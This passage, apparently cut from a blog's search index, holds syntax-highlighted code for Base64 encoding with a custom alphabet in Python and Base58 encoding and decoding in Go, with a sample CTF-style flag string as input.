class="built_in">format</span>(<span class="built_in">ord</span>(c),<span class="string">&#x27;0&gt;8b&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>])</span><br><span class="line">        <span class="comment"># Add additional zero</span></span><br><span class="line">        binary = self.padding(binary)</span><br><span class="line">        <span class="comment"># Get the index in indexing string</span></span><br><span class="line">        idxs = [<span class="built_in">int</span>(binary[<span class="number">6</span>*i:<span class="number">6</span>*i+<span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)//<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span>.join([self.idx_str[i] <span class="keyword">for</span> i <span class="keyword">in</span> idxs])</span><br><span class="line">        <span class="comment"># add &#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>)%<span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">            result = result + (<span class="number">3</span>-<span class="built_in">len</span>(<span class="built_in">str</span>)%<span class="number">3</span>)*<span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%r&quot;</span> % result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Decode string using the customized indexing string.</span></span><br><span class="line"><span class="string">        - args:</span></span><br><span class="line"><span class="string">            str: String to be decoded</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># remove &#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">str</span>[-<span class="number">1</span>]==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="built_in">str</span> = <span class="built_in">str</span>[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Get the binary string</span></span><br><span class="line">            binary = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">format</span>(self.idx_str.index(c), <span class="string">&#x27;0&gt;6b&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>])</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Remove additional zero</span></span><br><span class="line">            binary = self.remove(binary)</span><br><span class="line"></span><br><span class="line">            result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(binary[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)//<span class="number">8</span>)])</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            result = <span class="string">&quot;Please check again!&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%r&quot;</span> % result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">self, binary</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Remove additional zero while decoding string.</span></span><br><span class="line"><span class="string">        - args:</span></span><br><span class="line"><span class="string">            binary: Binary format of the index.</span></span><br><span class="line"><span class="string">        - returns:</span></span><br><span class="line"><span class="string">            Binary string without additional zero.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(binary)%<span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> binary</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> binary[:-(<span class="built_in">len</span>(binary)%<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">self, binary</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Add additional zero while encoding string.</span></span><br><span class="line"><span class="string">        - args:</span></span><br><span class="line"><span class="string">            binary: Binary format of the string.</span></span><br><span class="line"><span class="string">        - returns:</span></span><br><span class="line"><span class="string">            Binary string with additional zero.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(binary)%<span class="number">6</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> binary</span><br><span class="line">        n = <span class="number">6</span> - <span class="built_in">len</span>(binary)%<span class="number">6</span></span><br><span class="line">        binary = binary + n * <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> binary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">config</span>(<span class="params">self, <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Set customized indexing string.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.idx_str = <span class="built_in">str</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;New indexing string is %r&quot;</span> % self.idx_str)</span><br><span class="line"></span><br><span class="line">b = CusBase64()</span><br><span class="line">b.config(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>)</span><br><span class="line">b.encode(<span class="string">&#x27;flag&#123;this_is_a_sample_flag&#125;&#x27;</span>)</span><br><span class="line">b.decode(<span class="string">&#x27;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="base58"><a class="markdownIt-Anchor" href="#base58">#</a> base58</h4>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b58Alphabet = []<span class="type">byte</span>(<span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Base58Encode</span><span class="params">(input []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line">    x := big.NewInt(<span class="number">0</span>).SetBytes(input)</span><br><span class="line"></span><br><span class="line">    base := big.NewInt(<span class="type">int64</span>(<span class="built_in">len</span>(b58Alphabet)))</span><br><span class="line">    zero := big.NewInt(<span class="number">0</span>)</span><br><span class="line">    mod := &amp;big.Int&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x.Cmp(zero) != <span class="number">0</span> &#123;</span><br><span class="line">        x.DivMod(x, base, mod)</span><br><span class="line">        result = <span class="built_in">append</span>(result, b58Alphabet[mod.Int64()])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ReverseBytes(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> input &#123;</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0x00</span> &#123;</span><br><span class="line">            result = <span class="built_in">append</span>([]<span class="type">byte</span>&#123;b58Alphabet[<span class="number">0</span>]&#125;, result...)</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Base58Decode</span><span class="params">(input []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    result := big.NewInt(<span class="number">0</span>)</span><br><span class="line">    zeroBytes := <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> input &#123;</span><br><span class="line">        <span class="keyword">if</span> b != b58Alphabet[<span class="number">0</span>] &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        zeroBytes++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload := input[zeroBytes:]</span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> payload &#123;</span><br><span class="line">        charIndex := bytes.IndexByte(b58Alphabet, b)</span><br><span class="line">        result.Mul(result, big.NewInt(<span class="type">int64</span>(<span class="built_in">len</span>(b58Alphabet))))</span><br><span class="line">        result.Add(result, big.NewInt(<span class="type">int64</span>(charIndex)))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    decoded := result.Bytes()</span><br><span class="line">    decoded = <span class="built_in">append</span>(bytes.Repeat([]<span class="type">byte</span>&#123;<span class="type">byte</span>(<span class="number">0x00</span>)&#125;, zeroBytes), decoded...)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
</search>
